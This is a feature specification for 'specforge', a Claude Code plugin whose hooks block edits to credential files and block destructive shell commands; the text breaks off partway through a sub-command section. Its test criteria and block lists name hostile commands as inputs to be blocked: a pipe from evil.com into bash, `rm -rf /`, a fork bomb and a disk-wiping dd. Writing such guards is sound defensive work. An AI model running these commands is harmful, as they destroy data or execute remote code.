# Feature Specification: specforge

## Overview

**Project:** specforge
**Version:** 1.0.0
**Last Updated:** 2026-03-02
**Status:** Draft

### Summary

specforge is a Claude Code plugin that bundles spec-driven development hooks, skills, agents,
and scaffold projection for autonomous coding projects. It provides always-on quality gates
(file protection, command blocking, formatting, PR validation) alongside an interactive
specification workflow that produces artifacts consumed by initializer and coder agents for
multi-session autonomous implementation. The repository claude-project-foundation is
transformed into the plugin itself.

### Scope

- Plugin structure and manifest (`.claude-plugin/`)
- Runtime layer: 6 Claude Code hooks, 1 skill with 9 sub-commands (7 spec workflow + init + upgrade), 2 agents
- Scaffold layer: CI workflows, git hooks, templates, CLAUDE.md, quality principles projected into host projects
- CI pipeline for the plugin itself: ShellCheck, markdownlint, Prettier, plugin structure validation, tag-triggered releases with artifact attestation
- P0 bug fixes: shebang corruption, WORKFLOW.md corruption, JSON key standardization
- P1 improvements: batch formatter hook, safety block, enhanced validation patterns

### Out of Scope

- MCP server configurations
- LSP server configurations

---

## Infrastructure Features

Infrastructure features have NO dependencies. They establish the foundation.

### INFRA-001: Plugin Directory Structure

**Description:** Transform the repository from a standalone scaffold into a Claude Code plugin by creating the `.claude-plugin/` root directory with a valid `plugin.json` manifest and `marketplace.json` for distribution. This is the foundational structure that all other features reference.

**Acceptance Criteria:**

- [ ] File `.claude-plugin/plugin.json` exists and `jq empty .claude-plugin/plugin.json` exits 0 (valid JSON)
- [ ] `plugin.json` contains `name` field with value `"specforge"`
- [ ] `plugin.json` contains `version` field matching regex `^\d+\.\d+\.\d+$`
- [ ] `plugin.json` contains non-empty `description` and `author` string fields
- [ ] `plugin.json` contains `hooks` field with value `"hooks/hooks.json"`
- [ ] `plugin.json` contains `skills` array with at least one entry whose `path` ends with `skills/specforge/SKILL.md`
- [ ] `plugin.json` contains `agents` array with entries for paths ending in `agents/initializer.md` and `agents/coder.md`
- [ ] `plugin.json` does NOT contain a `commands` array (init and upgrade are skill sub-commands, not standalone commands)
- [ ] File `.claude-plugin/marketplace.json` exists and `jq empty .claude-plugin/marketplace.json` exits 0 (valid JSON)
- [ ] `marketplace.json` contains `name` field and `plugins` array with at least one entry containing a `source` object
- [ ] Every file path in `plugin.json` (`skills[*].path`, `agents[*].path`, `hooks`) resolves to an existing file when evaluated relative to `.claude-plugin/`

**Dependencies:** None

---

### INFRA-002: Fix Shebang Corruption in protect-files.sh

**Description:** The file `.claude/hooks/protect-files.sh` has a corrupted shebang: `cl#!/bin/bash` instead of `#!/bin/bash`. This prevents the script from executing correctly. Fix the shebang in both the legacy location and ensure the plugin copy is correct.

**Acceptance Criteria:**

- [ ] Running `head -n 1 .claude/hooks/protect-files.sh` outputs `#!/bin/bash` (the first line is the shebang, not a corrupted prefix)
- [ ] Running `bash -n .claude/hooks/protect-files.sh` exits 0 (valid bash syntax)
- [ ] Running `shellcheck .claude/hooks/protect-files.sh` reports no errors (warnings acceptable)
- [ ] The corresponding plugin hook file under `.claude-plugin/hooks/` also has a correct `#!/bin/bash` shebang as its first line

**Dependencies:** None

---

### INFRA-003: Fix WORKFLOW.md Corruption

**Description:** The file `.specify/WORKFLOW.md` has a corrupted first line: `claude# Workflow Documentation` instead of `# Workflow Documentation`. Fix the heading so the file renders correctly as Markdown.

**Acceptance Criteria:**

- [ ] Running `head -n 1 .specify/WORKFLOW.md` outputs exactly `# Workflow Documentation` with no preceding characters
- [ ] Running `grep -c '^claude#' .specify/WORKFLOW.md` outputs `0` (no corrupted headings remain)
- [ ] The file passes markdownlint with no heading-related errors

**Dependencies:** None

---

### INFRA-004: Standardize Hook JSON Key to tool_input

**Description:** All Claude Code hooks currently parse `input.file_path`, `input.command`, etc. from the JSON stdin payload. The Claude Code protocol uses `tool_input` as the top-level key. Every hook script must be updated to read `tool_input.*` instead of `input.*`.

**Acceptance Criteria:**

- [ ] Running `grep -r '\.input\b' .claude/hooks/` returns no matches (no legacy `.input` jq accessor)
- [ ] Running `grep -r '\.tool_input' .claude/hooks/` returns at least one match in each of: `protect-files.sh`, `post-edit.sh`, `validate-bash.sh`, `validate-pr.sh`
- [ ] `echo '{"tool_input":{"file_path":"/tmp/safe.txt"}}' | bash .claude/hooks/protect-files.sh` exits 0
- [ ] `echo '{"tool_input":{"file_path":".env"}}' | bash .claude/hooks/protect-files.sh` exits with non-zero
- [ ] `echo '{"tool_input":{"command":"ls"}}' | bash .claude/hooks/validate-bash.sh` exits 0
- [ ] `echo '{"tool_input":{"command":"rm -rf /"}}' | bash .claude/hooks/validate-bash.sh` exits with non-zero

**Dependencies:** None

---

### INFRA-005: Plugin Hooks Manifest

**Description:** Create `hooks/hooks.json` inside `.claude-plugin/` that declares all 6 Claude Code hooks with their event types, matchers, and script paths using `${CLAUDE_PLUGIN_ROOT}`. This is the plugin-native hook configuration that replaces per-project `.claude/settings.json`.

**Acceptance Criteria:**

- [ ] File `.claude-plugin/hooks/hooks.json` exists and parses as valid JSON
- [ ] JSON structure declares `PreToolUse` array containing hooks for: `protect-files.sh` (matcher: `Write|Edit`), `validate-bash.sh` (matcher: `Bash`), `validate-pr.sh` (matcher: `Bash`)
- [ ] JSON structure declares `PostToolUse` array containing hook for: `post-edit.sh` (matcher: `Write|Edit`)
- [ ] JSON structure declares `Stop` array containing hooks in order: `format-changed.sh` first, `verify-quality.sh` second
- [ ] Every `command` value in hooks.json uses `${CLAUDE_PLUGIN_ROOT}` prefix for script paths
- [ ] Every script path referenced in hooks.json resolves to an existing `.sh` file when `${CLAUDE_PLUGIN_ROOT}` is replaced with `.claude-plugin`
- [ ] All referenced hook scripts have `#!/bin/bash` as their first line
- [ ] All referenced hook scripts pass `shellcheck` with no errors

**Dependencies:** None

---

### INFRA-006: CI Pipeline with Plugin Validation

**Description:** Update `.github/workflows/ci.yml` to add a `plugin-validation` job. Update all `actions/checkout` to the latest stable version at implementation time (check github.com/actions/checkout/releases). The plugin-validation job checks `plugin.json` integrity, referenced file paths, `hooks.json` validity, and SKILL.md existence.

**Acceptance Criteria:**

- [ ] `.github/workflows/ci.yml` contains a job named `plugin-validation`
- [ ] `plugin-validation` job runs `jq empty .claude-plugin/plugin.json` and fails the job if it exits non-zero
- [ ] `plugin-validation` job validates that every file path in `plugin.json` resolves to an existing file (using a script or inline step)
- [ ] `plugin-validation` job validates `hooks/hooks.json` is valid JSON and all referenced hook scripts exist
- [ ] Running `grep -c 'actions/checkout@v4' .github/workflows/ci.yml` outputs `0` (no v4 references remain)
- [ ] All `actions/checkout` references use the latest stable version at implementation time (agent should check github.com/actions/checkout/releases during implementation)
- [ ] Running `grep -c 'actions/checkout@v4' ci/github/workflows/ci.yml` outputs `0`
- [ ] The `summary` job's `needs` array includes `plugin-validation`
- [ ] The workflow has a top-level `permissions` block

**Dependencies:** None

---

### INFRA-007: Tag-Triggered Release Workflow

**Description:** Create `.github/workflows/release.yml` triggered by `v*` tags. Validates tag version matches `plugin.json` version, runs CI checks, creates a GitHub release with auto-generated notes, and attaches artifact attestation for supply chain provenance.

**Acceptance Criteria:**

- [ ] File `.github/workflows/release.yml` exists and is valid YAML
- [ ] Workflow triggers on `push: tags: ['v*']`
- [ ] Workflow contains a step that extracts the version from the git tag (strips `v` prefix) and compares it to the `version` field in `.claude-plugin/plugin.json`
- [ ] Workflow fails if tag version and plugin.json version do not match
- [ ] Workflow runs shellcheck, markdownlint, prettier, and plugin-validation steps (either inline or by calling the CI workflow)
- [ ] Workflow creates a GitHub release using `gh release create` or `actions/create-release`
- [ ] Workflow includes `permissions: contents: write, id-token: write, attestations: write` (or equivalent)
- [ ] Workflow references `actions/attest-build-provenance` for artifact attestation
- [ ] Running `yq eval '.' .github/workflows/release.yml > /dev/null 2>&1` exits 0 (valid YAML; or manual review if yq is unavailable)

**Dependencies:** None

---

### INFRA-008: Settings.json Safety Block

**Description:** Add defense-in-depth `blockedCommands` and `protectedFiles` to the plugin's settings or manifest. These static declarations are enforced by Claude Code even if hook scripts fail to execute.

**Acceptance Criteria:**

- [ ] The plugin configuration (in `plugin.json`, `settings.json`, or hooks.json -- whichever the plugin spec supports) includes a `blockedCommands` array
- [ ] `blockedCommands` contains at minimum these 7 patterns: `rm -rf /`, `rm -rf ~`, `git push --force`, `git reset --hard`, `git clean -fd`, `chmod 777`, `mkfs`
- [ ] The plugin configuration includes a `protectedFiles` array
- [ ] `protectedFiles` contains at minimum these 8 patterns: `.env`, `.env.*`, `*.pem`, `*.key`, `*.crt`, `id_rsa`, `id_ed25519`, `credentials.json`
- [ ] The configuration file is valid JSON (`jq empty <file>` exits 0)

**Dependencies:** None

---

### INFRA-009: Shared Formatter Dispatch Library

**Description:** Create a shared shell library (`hooks/_formatter-dispatch.sh` or
`scripts/_formatter-dispatch.sh`) that contains the format detection and execution logic
used by both `post-edit.sh` (FUNC-004) and `format-changed.sh` (FUNC-005). This library
encapsulates: file extension to formatter mapping, Prettier root discovery (walk up from
file looking for `.prettierrc` or `package.json`), formatter availability checks, and
formatter invocation with error suppression. Both hooks source this file instead of
duplicating the logic.

**Acceptance Criteria:**

- [ ] File `hooks/_formatter-dispatch.sh` (or `scripts/_formatter-dispatch.sh`) exists under `.claude-plugin/`
- [ ] The file defines a `format_file()` function that takes a file path and runs the appropriate formatter based on extension
- [ ] The file defines a `find_prettier_root()` function that walks up from the given file looking for `.prettierrc` or `package.json`, with fallback to scanning all immediate subdirectories of the git root
- [ ] Running `bash -n <file>` exits 0 (valid bash syntax)
- [ ] Running `shellcheck <file>` reports no errors
- [ ] The extension-to-formatter mapping covers: ts/tsx/js/jsx/json/css/html/md/yaml/yml (Prettier), py (ruff > black > autopep8), rs (rustfmt), sh (shfmt), go (gofmt), rb (rubocop), java/kt (google-java-format)
- [ ] Both `post-edit.sh` and `format-changed.sh` source this file (contain `. "path/to/_formatter-dispatch.sh"` or `source "path/to/_formatter-dispatch.sh"`)
- [ ] No formatter dispatch logic is duplicated between `post-edit.sh` and `format-changed.sh`

**Dependencies:** None

---

## Functional Features

Core application behavior. Each includes Given/When/Then criteria, error handling, and dependencies.

### FUNC-001: protect-files.sh PreToolUse Hook

**Description:** PreToolUse hook that fires on Write and Edit tool invocations. Blocks
modification of sensitive files: environment files, SSH keys, certificates, credentials,
cloud configs, lock files, and files in sensitive directories. Adds an allowlist for
`.example` and `.sample` suffixed files. Uses exit code 2 for blocks (Claude Code
PreToolUse convention).

**Acceptance Criteria:**

- **Given** a Write tool call with `tool_input.file_path` of `.env`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: Environment file"

- **Given** a Write tool call with `tool_input.file_path` of `.env.local`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: Environment file"

- **Given** a Write tool call with `tool_input.file_path` of `.env.example`
  **When** the hook executes
  **Then** it exits 0 (allowed by the `.example` allowlist)

- **Given** a Write tool call with `tool_input.file_path` of `.env.sample`
  **When** the hook executes
  **Then** it exits 0 (allowed by the `.sample` allowlist)

- **Given** a Write tool call with `tool_input.file_path` of `config/id_rsa`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: SSH key/config file"

- **Given** a Write tool call with `tool_input.file_path` of `certs/server.pem`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: Certificate/key file"

- **Given** a Write tool call with `tool_input.file_path` of `package-lock.json`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: Lock file (auto-generated)"

- **Given** a Write tool call with `tool_input.file_path` of `src/.aws/config`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: File in sensitive directory"

- **Given** a Write tool call with `tool_input.file_path` of `src/main.ts`
  **When** the hook executes
  **Then** it exits 0 (allowed, no sensitive pattern match)

- **Given** a Write tool call with empty or missing `tool_input.file_path`
  **When** the hook executes
  **Then** it exits 0 (no file to check, fail open)

- **Given** malformed JSON on stdin
  **When** the hook executes
  **Then** it exits 0 (fail open on parse error)

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| JSON parsing fails (malformed stdin) | Exit 0 (fail open) | None |
| `tool_input` key missing from JSON | Exit 0 (fail open) | None |
| `file_path` is empty string | Exit 0 (no file to check) | None |
| `jq` not available | Exit 0 (fail open) | None |

**Edge Cases:**

- Script starts with `set -euo pipefail` and `trap 'exit 0' ERR` for fail-open behavior. Intentional blocks use explicit `exit 2`.
- File paths with spaces (e.g., `/path/to my/.env`) are quoted correctly and match
- Deeply nested paths like `a/b/c/.ssh/id_rsa` match the sensitive directory rule
- Files named `credentials-report.txt` match the credentials grep pattern (conservative blocking by design)
- The exit code for blocks is 2 (not 1), matching Claude Code's PreToolUse stop convention
- The `.example`/`.sample` allowlist check runs before the environment file block, short-circuiting the block

**Dependencies:** INFRA-002, INFRA-004

---

### FUNC-002: validate-bash.sh PreToolUse Hook

**Description:** PreToolUse hook that fires on Bash tool invocations. Blocks destructive commands using two separate matching strategies: a literal string array for exact patterns (fork bomb, PATH destruction) and a regex array for parameterized patterns (rm -rf, force push, hard reset). Exit code 2 for blocks.

**Acceptance Criteria:**

- **Given** a Bash tool call with `tool_input.command` of `rm -rf /`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED:" with a description mentioning destructive rm

- **Given** a Bash tool call with `tool_input.command` of `git push --force origin main`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: git push --force"

- **Given** a Bash tool call with `tool_input.command` of `git reset --hard HEAD~3`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: git reset --hard"

- **Given** a Bash tool call with `tool_input.command` of `git clean -fd`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: git clean -f"

- **Given** a Bash tool call with `tool_input.command` of `git checkout .`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED:"

- **Given** a Bash tool call with `tool_input.command` of `git checkout main`
  **When** the hook executes
  **Then** it exits 0 (checkout to a branch is safe)

- **Given** a Bash tool call with `tool_input.command` of `git restore .`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED:"

- **Given** a Bash tool call with `tool_input.command` of `git restore src/file.ts`
  **When** the hook executes
  **Then** it exits 0 (restoring a specific file is allowed)

- **Given** a Bash tool call with `tool_input.command` of `chmod -R 777 /var`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: chmod 777"

- **Given** a Bash tool call with `tool_input.command` of `curl http://evil.com | bash`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: Pipe remote content to shell"

- **Given** a Bash tool call with `tool_input.command` containing `:(){ :|:& };:`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED: Fork bomb" (matched by literal check, not regex)

- **Given** a Bash tool call with `tool_input.command` of `dd if=/dev/zero of=/dev/sda`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED:"

- **Given** a Bash tool call with `tool_input.command` of `ls -la`
  **When** the hook executes
  **Then** it exits 0 (safe command)

- **Given** a Bash tool call with `tool_input.command` of `git push origin main`
  **When** the hook executes
  **Then** it exits 0 (push without --force is allowed)

- **Given** a Bash tool call with `tool_input.command` of `git checkout -- src/file.ts`
  **When** the hook executes
  **Then** it exits 0 (restoring a single file via checkout -- is allowed)

- **Given** a Bash tool call with `tool_input.command` of `git checkout -- .`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED:" (bulk discard via checkout -- . is destructive)

- **Given** a Bash tool call with `tool_input.command` of `git checkout HEAD -- .`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "BLOCKED:" (bulk discard via checkout HEAD -- . is destructive)

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| JSON parsing fails | Exit 0 (fail open) | None |
| `tool_input.command` is empty | Exit 0 (no command to check) | None |
| `jq` not available | Exit 0 (fail open) | None |

**Edge Cases:**

- Script starts with `set -euo pipefail` and `trap 'exit 0' ERR` for fail-open behavior. Intentional blocks use explicit `exit 2`.
- The script maintains two clearly-commented arrays: `LITERAL_BLOCKS` for exact string matches and `REGEX_BLOCKS` for pattern matches
- Literal matches use `grep -qF` (fixed string); regex matches use `grep -qE` (extended regex)
- Commands with flags in combined form (e.g., `rm -rf`) and separated form (e.g., `rm -r -f`) are both caught by the regex
- Multi-line commands are checked as a single string (newlines within the command field)

**Dependencies:** INFRA-004

---

### FUNC-003: validate-pr.sh PreToolUse Hook

**Description:** PreToolUse hook that fires on Bash tool invocations containing `gh pr create`. Validates PR title and body for AI-isms, emoji, marketing language, AI branding, and Co-Authored-By trailers. Extended to strip `.claude/` path prefixes before validation and skip backtick-wrapped code references.

**Acceptance Criteria:**

- **Given** a Bash tool call with `gh pr create --title "I have fixed the bug" --body "Description"`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "Self-reference: 'I have'"

- **Given** a Bash tool call with `gh pr create --title "feat: add login" --body "Uses the Anthropic API"`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "AI branding: Anthropic"

- **Given** a Bash tool call with `gh pr create --title "Seamless integration" --body "clean body"`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "Marketing adjective: 'seamless'"

- **Given** a Bash tool call with a `gh pr create` body containing `Co-Authored-By: Bot <bot@example.com>`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "Co-Authored-By trailer"

- **Given** a Bash tool call with a clean `gh pr create --title "feat: add auth flow" --body "Adds JWT authentication"`
  **When** the hook executes
  **Then** it exits 0 (no violations)

- **Given** a Bash tool call with `gh pr create --title "fix: update Claude Code docs"`
  **When** the hook executes
  **Then** it exits 0 ("Claude Code" is an allowed product name)

- **Given** a Bash tool call with `gh pr create --title "fix: update Claude docs"`
  **When** the hook executes
  **Then** it exits 2 and stderr contains "Standalone 'Claude'"

- **Given** a Bash tool call with `npm install` (not a PR command)
  **When** the hook executes
  **Then** it exits 0 immediately (non-PR commands are skipped)

- **Given** a Bash tool call with `gh pr create` whose body contains `.claude/hooks/protect-files.sh`
  **When** the hook validates
  **Then** the `.claude/` prefix is stripped from file path references before checking for violations (prevents false positives on path components)

- **Given** a Bash tool call with `gh pr create` whose body contains backtick-wrapped code like `` `robust_check` ``
  **When** the hook validates
  **Then** backtick-wrapped content is excluded from marketing adjective checks (`` `robust_check` `` does not trigger "Marketing adjective: 'robust'")

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| JSON parsing fails | Exit 0 (fail open) | None |
| `jq` not available | Exit 0 (fail open) | None |
| `--title` not found in command | Validate body only, exit 0 if clean | None |
| `--body` not found in command | Validate title only, exit 0 if clean | None |
| Heredoc body `$(cat <<'EOF'...EOF)` | Parse heredoc content for validation | None |

**Edge Cases:**

- Script starts with `set -euo pipefail` and `trap 'exit 0' ERR` for fail-open behavior. Intentional blocks use explicit `exit 2`.
- "Claude Code" is allowed but standalone "Claude" is blocked
- Parenthetical scopes like `feat(auth)` are stripped before AI-ism checks
- File paths (strings containing `/`) are stripped before marketing adjective checks
- The full list of blocked marketing adjectives: seamless, robust, powerful, elegant, streamlined, polished, enhanced, refined
- The full list of blocked AI-isms: "I have", "I've", "I updated", "I fixed", "Certainly", "I'd be happy to", "As an AI"
- Emoji detection covers Unicode ranges: U+1F300-U+1F9FF, U+2600-U+27BF, U+FE00-U+FE0F, U+200D, U+2702-U+27B0, U+1FA00-U+1FA6F, U+1FA70-U+1FAFF

**Dependencies:** INFRA-004

---

### FUNC-004: post-edit.sh PostToolUse Hook

**Description:** PostToolUse hook that fires after Write and Edit tool invocations. Auto-formats the edited file based on its extension using the appropriate language formatter. This is the supplementary per-file formatter. All formatting is best-effort (failures never block).

**Acceptance Criteria:**

- **Given** a Write tool creates a `.ts` file and Prettier is available via npx in a nearby `package.json`
  **When** the hook executes
  **Then** it runs `npx prettier --write <file>` and exits 0 regardless of formatter outcome

- **Given** a Write tool creates a `.py` file and `ruff` is on PATH
  **When** the hook executes
  **Then** it runs `ruff format <file>` followed by `ruff check --fix <file>` and exits 0

- **Given** a Write tool creates a `.go` file and `gofmt` is on PATH
  **When** the hook executes
  **Then** it runs `gofmt -w <file>` and exits 0

- **Given** a Write tool creates a `.rs` file and `rustfmt` is on PATH
  **When** the hook executes
  **Then** it runs `rustfmt <file>` and exits 0

- **Given** a Write tool creates a `.sh` file and `shfmt` is on PATH
  **When** the hook executes
  **Then** it runs `shfmt -w <file>` and exits 0

- **Given** a Write tool creates a `.rb` file and `rubocop` is on PATH
  **When** the hook executes
  **Then** it runs `rubocop -a <file>` and exits 0

- **Given** a Write tool creates a `.java` file and `google-java-format` is on PATH
  **When** the hook executes
  **Then** it runs `google-java-format --replace <file>` and exits 0

- **Given** no formatter is installed for the file's extension
  **When** the hook executes
  **Then** it exits 0 silently (no error, no output)

- **Given** the file does not exist on disk
  **When** the hook executes
  **Then** it exits 0 silently

- **Given** the file has an unrecognized extension (e.g., `.xyz`)
  **When** the hook executes
  **Then** it exits 0 silently (no formatter attempted)

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| JSON parsing fails | Exit 0 | None |
| File path is empty | Exit 0 | None |
| File does not exist | Exit 0 | None |
| Formatter crashes | Exit 0 (each formatter call is wrapped in `\|\| true`) | None |
| No `package.json` found for Prettier | Fall back to global `prettier` command if available | None |
| Global `prettier` also not found | Skip Prettier formatting | None |

**Edge Cases:**

- Script starts with `set -euo pipefail` and `trap 'exit 0' ERR` for fail-open behavior. All formatting is best-effort.
- Prettier root discovery walks up from the edited file looking for `.prettierrc` or `package.json`. No hardcoded subdirectory list.
- Fallback: scan all immediate subdirectories of the git root for `.prettierrc` or `package.json`
- Final fallback: `git rev-parse --show-toplevel` (project root itself)
- Supported extensions and their formatters: ts/tsx/js/jsx/json/css/html/md/yaml/yml (Prettier), py (ruff > black > autopep8), rs (rustfmt), sh (shfmt), go (gofmt), rb (rubocop), java/kt (google-java-format)
- Files may be formatted twice (PostToolUse via post-edit.sh + Stop via format-changed.sh). Formatters are idempotent; this is acceptable.

**Dependencies:** INFRA-004, INFRA-009

---

### FUNC-005: format-changed.sh Stop Hook (Batch Formatter)

**Description:** New Stop hook that discovers all files changed in the git working tree (staged + unstaged) and batch-formats them using language-appropriate formatters. This is the primary formatting mechanism. Runs before `verify-quality.sh` in the Stop hook chain. Checks `stop_hook_active` to prevent infinite recursion.

**Acceptance Criteria:**

- **Given** the working tree has modified `.ts` and `.py` files, Prettier and ruff are available
  **When** the Stop hook fires
  **Then** it formats each file with its language-appropriate formatter and exits 0

- **Given** the working tree has no modified files (`git diff --name-only` and `git diff --cached --name-only` both return empty)
  **When** the Stop hook fires
  **Then** it prints "No changed files to format" to stdout and exits 0

- **Given** `stop_hook_active` is `true` in the JSON stdin payload (top-level boolean, e.g., `{"stop_hook_active": true}`)
  **When** the Stop hook fires
  **Then** it exits 0 immediately without running any formatters

- **Given** the current directory is not inside a git repository
  **When** the Stop hook fires
  **Then** it exits 0 without error

- **Given** a `.go` file is changed but `gofmt` is not installed
  **When** the Stop hook fires
  **Then** it skips that file and continues to format other changed files

- **Given** Prettier crashes on a `.md` file
  **When** the Stop hook fires
  **Then** it skips that file (error suppressed by `|| true`) and continues

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| `stop_hook_active` is `true` (JSON boolean) | Exit 0 immediately | None |
| Not in a git repository | Exit 0 | "Not in a git repository. Skipping format." |
| No changed files | Exit 0 | "No changed files to format" |
| Formatter not found for a file type | Skip file, continue | None |
| Formatter crashes on a file | Skip file (`\|\| true`), continue | None |
| JSON parsing of stdin fails | Default to `stop_hook_active=False`, proceed | None |

**Edge Cases:**

- Script starts with `set -euo pipefail` and `trap 'exit 0' ERR` for fail-open behavior. Intentional blocks use explicit `exit 2`.
- Changed files are discovered via `git diff --name-only` (unstaged) and `git diff --cached --name-only` (staged), deduplicated
- Deleted files (D status in `git diff --diff-filter`) are excluded
- Binary files are excluded by extension: `.png`, `.jpg`, `.jpeg`, `.gif`, `.ico`, `.woff`, `.woff2`, `.ttf`, `.eot`, `.mp3`, `.mp4`, `.zip`, `.tar`, `.gz`, `.exe`, `.dll`, `.so`, `.dylib`
- The hook uses the same formatter dispatch logic as `post-edit.sh` (same extension-to-formatter mapping)
- This hook MUST be listed before `verify-quality.sh` in the Stop array in `hooks.json`
- Files may be formatted twice (PostToolUse via post-edit.sh + Stop via format-changed.sh). Formatters are idempotent; this is acceptable.

**Dependencies:** INFRA-004, INFRA-005, INFRA-009

---

### FUNC-006: verify-quality.sh Stop Hook

**Description:** Stop hook that runs quality checks (lint, type check, tests) before allowing Claude Code to stop. Auto-detects project types from config files at the project root and one level of subdirectories. Uses exit code 2 to block the stop if any required check fails. Checks `stop_hook_active` to prevent infinite recursion.

**Acceptance Criteria:**

- **Given** a Node.js project with `package.json`, `tsconfig.json`, and a `"test"` script in package.json
  **When** the Stop hook fires
  **Then** it runs ESLint (optional), TypeScript `tsc --noEmit` (required), and `npm test` (required), printing "[check]" or "[optional]" prefix for each

- **Given** a Python project with `pyproject.toml` and ruff installed
  **When** the Stop hook fires
  **Then** it runs `ruff check` (required) and `ruff format --check` (optional)

- **Given** a Go project with `go.mod`
  **When** the Stop hook fires
  **Then** it runs `go vet ./...` (required) and `go test ./... -count=1` (optional)

- **Given** a Rust project with `Cargo.toml`
  **When** the Stop hook fires
  **Then** it runs `cargo check` (required), `cargo clippy -- -D warnings` (required), and `cargo test --no-run` (optional)

- **Given** a monorepo with `frontend/package.json` and `backend/go.mod`
  **When** the Stop hook fires
  **Then** it discovers and checks both subprojects, reporting results for each

- **Given** one required check (`run_check`) fails
  **When** the hook finishes all checks
  **Then** it exits 2, prints "Quality gate FAILED. Fix issues before stopping." to stderr, and reports the check count and failure count

- **Given** all required checks pass but one optional check (`run_optional_check`) fails
  **When** the hook finishes all checks
  **Then** it exits 0 and prints "Quality gate passed with warnings."

- **Given** no recognized project type is found
  **When** the hook runs
  **Then** it prints "No recognized project type found. Skipping quality checks." and exits 0

- **Given** `stop_hook_active` is `true` in stdin JSON (top-level boolean, e.g., `{"stop_hook_active": true}`)
  **When** the hook runs
  **Then** it exits 0 immediately without running any checks

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| `stop_hook_active` is `true` (JSON boolean) | Exit 0 immediately | None |
| No recognized project type | Exit 0 | "No recognized project type found. Skipping quality checks." |
| A linting tool not installed | Skip that check | None |
| JSON parsing of stdin fails | Default to `stop_hook_active=False`, proceed | None |

**Edge Cases:**

- Script starts with `set -euo pipefail` and `trap 'exit 0' ERR` for fail-open behavior. Intentional blocks use explicit `exit 2`.
- `$CLAUDE_PROJECT_DIR` env var is used if set; falls back to `git rev-parse --show-toplevel`; falls back to `pwd`
- Subdirectory scanning checks one level deep: `"$PROJECT_ROOT"/*/`
- Bash arithmetic uses `VAR=$((VAR + 1))` not `((VAR++))` to avoid failure when VAR=0 under `set -e`
- Required checks use `run_check` (failure increments FAILED); optional checks use `run_optional_check` (failure increments WARNINGS)
- The summary line format: `"Checks run: N"`, `"Failed: N"`, `"Warnings: N"`

**Dependencies:** INFRA-004

---

### FUNC-007: /specforge constitution Sub-Command

**Description:** Interactive sub-command that guides the user through defining immutable project principles. Reads the constitution template, presents each section one at a time, asks focused questions for every field (never auto-fills), assembles responses into `.specify/memory/constitution.md`, and presents the complete document for final review.

**Acceptance Criteria:**

- **Given** the user runs `/specforge constitution` and the template file exists at `${CLAUDE_PLUGIN_ROOT}/templates/constitution-template.md` (or `.specify/templates/constitution-template.md`)
  **When** the skill activates
  **Then** it reads the template and presents the "Project Identity" section, asking for: project name, one-line description, primary language(s), target platform(s)

- **Given** the user has answered the Project Identity questions
  **When** the skill proceeds
  **Then** it presents the next section ("Non-Negotiable Principles") and asks the user to define 2-5 principles

- **Given** all 6 sections have been completed (Project Identity, Non-Negotiable Principles, Quality Standards, Architectural Constraints, Security Requirements, Out of Scope)
  **When** the skill assembles the constitution
  **Then** it writes `.specify/memory/constitution.md` containing all user-provided values with zero placeholder or template text remaining

- **Given** the complete constitution is presented for review
  **When** the user requests a change (e.g., "change principle 2")
  **Then** the skill applies the change and presents the updated section

- **Given** `.specify/memory/constitution.md` already exists
  **When** the user runs `/specforge constitution`
  **Then** the skill reads the existing file, displays it, and asks whether to revise specific sections or start fresh

- **Given** the file `skills/specforge/SKILL.md` under `.claude-plugin/` is inspected
  **When** its content is checked
  **Then** it contains an H3 section `### /specforge constitution`

- **Given** the `### /specforge constitution` section in SKILL.md is read
  **When** its content is checked
  **Then** the section references a template path containing `constitution-template.md`

- **Given** the `### /specforge constitution` section in SKILL.md is read
  **When** its output path is checked
  **Then** the section references `.specify/memory/constitution.md` as the output artifact

**Error Handling:**

| Error Condition | Expected Behavior | User-Facing Message |
| --- | --- | --- |
| Template file not found | Use known section structure from memory | "Constitution template not found. Using default section structure." |
| `.specify/memory/` directory missing | Create the directory | None (silent mkdir -p) |
| User provides empty response for a required field | Re-prompt | "This field is required. Please provide a value." |

**Edge Cases:**

- The 6 sections are always presented in order: Project Identity, Non-Negotiable Principles, Quality Standards, Architectural Constraints, Security Requirements, Out of Scope
- The skill never generates or suggests values. Every value comes from user input.
- If the user says "skip" for an optional sub-field, the skill writes "Not specified" rather than omitting the field

**Dependencies:** INFRA-001

---

### FUNC-008: /specforge spec Sub-Command

**Description:** Interactive sub-command that documents features and acceptance criteria. Reads the constitution, asks the user to describe features in plain language, asks follow-up questions for each feature area, groups them into categories, and writes `.specify/specs/spec.md` using the spec template format.

**Acceptance Criteria:**

- **Given** the user runs `/specforge spec` and `.specify/memory/constitution.md` exists
  **When** the skill activates
  **Then** it reads the constitution and prompts the user to describe the first feature or feature area

- **Given** the user describes a feature
  **When** the skill processes the description
